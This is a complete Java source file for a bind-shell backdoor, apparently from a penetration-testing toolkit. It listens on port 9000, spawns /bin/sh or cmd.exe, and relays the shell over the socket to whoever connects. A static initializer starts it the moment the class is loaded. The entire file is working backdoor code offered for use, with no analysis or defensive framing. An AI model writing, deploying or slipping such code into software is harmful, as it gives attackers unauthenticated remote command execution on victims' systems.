// Copyright (c) 2021 Ivan Šincek
// v2.9
// Requires Java SE v8 or greater and JDK v8 or greater.
// Works on Linux OS, macOS, and Windows OS.

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;

public class BindShell {
    
    // change the port number as necessary
    private static int     port   = 9000;
    private static String  os     = null;
    private static String  shell  = null;
    private static byte[]  buffer = null;
    private static int     clen   = 0;
    private static boolean error  = false;
    
    private static boolean detect() {
        boolean detected = true;
        os = System.getProperty("os.name").toUpperCase();
        if (os.contains("LINUX") || os.contains("MAC")) {
            os    = "LINUX";
            shell = "/bin/sh";
        } else if (os.contains("WIN")) {
            os    = "WINDOWS";
            shell = "cmd.exe";
        } else {
            detected   = false;
            System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
        }
        return detected;
    }
    
    // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
    private static void brw(InputStream input, OutputStream output, String iname, String oname) {
        int bytes = 0;
        try {
            do {
                if (os.equals("WINDOWS") && iname.equals("STDOUT") && clen > 0) {
                    // for some reason Windows OS pipes STDIN into STDOUT
                    // we do not like that
                    // we need to discard the data from the stream
                    do {
                        bytes = input.read(buffer, 0, clen >= buffer.length ? buffer.length : clen);
                        clen -= clen >= buffer.length ? buffer.length : clen;
                    } while (bytes > 0 && clen > 0);
                } else {
                    bytes = input.read(buffer, 0, buffer.length);
                    if (bytes > 0) {
                        output.write(buffer, 0, bytes);
                        output.flush();
                        if (os.equals("WINDOWS") && oname.equals("STDIN")) {
                            clen += bytes;
                        }
                    } else if (iname.equals("SOCKET")) {
                        error = true;
                        System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
                    }
                }
            } while (input.available() > 0);
        } catch (SocketTimeoutException ex) {} catch (IOException ex) {
            error = true;
            System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n\n", iname, oname));
        }
    }
    
    public static void run() {
        if (detect()) {
            ServerSocket listener = null;
            
            Socket       client   = null;
            OutputStream socin    = null;
            InputStream  socout   = null;
            
            Process      process  = null;
            OutputStream stdin    = null;
            InputStream  stdout   = null;
            InputStream  stderr   = null;
            
            System.out.print("Backdoor is up and running...\n\n");
            System.out.print("Waiting for client to connect...\n\n");
            try {
                listener = new ServerSocket(port);
                do {
                    client = listener.accept();
                } while (client == null);
                client.setSoTimeout(100);
                socin  = client.getOutputStream();
                socout = client.getInputStream();
                
                buffer = new byte[1024];
                
                process = new ProcessBuilder(shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
                stdin   = process.getOutputStream();
                stdout  = process.getInputStream();
                stderr  = process.getErrorStream();
                
                System.out.print("Client has connected!\n\n");
                do {
                    if (!process.isAlive()) {
                        System.out.print("PROC_ERROR: Shell process has been terminated\n\n"); break;
                    }
                    brw(socout, stdin, "SOCKET", "STDIN");
                    if (stderr.available() > 0) { brw(stderr, socin, "STDERR", "SOCKET"); }
                    if (stdout.available() > 0) { brw(stdout, socin, "STDOUT", "SOCKET"); }
                } while (!error);
                System.out.print("Client has disconnected!\n");
            } catch (IOException ex) {
                System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
            } finally {
                if (stdin   != null) { try { stdin.close() ; } catch (IOException ex) {} }
                if (stdout  != null) { try { stdout.close(); } catch (IOException ex) {} }
                if (stderr  != null) { try { stderr.close(); } catch (IOException ex) {} }
                if (process != null) { process.destroy(); }
                
                if (socin  != null) { try { socin.close() ; } catch (IOException ex) {} }
                if (socout != null) { try { socout.close(); } catch (IOException ex) {} }
                if (client != null) { try { client.close(); } catch (IOException ex) {} }
                
                if (buffer != null) { Arrays.fill(buffer, (byte)0); }
                
                if (listener != null) { try { listener.close(); } catch (IOException ex) {} }
            }
        }
    }
    
    static {
        run();
        System.gc();
    }
    
}
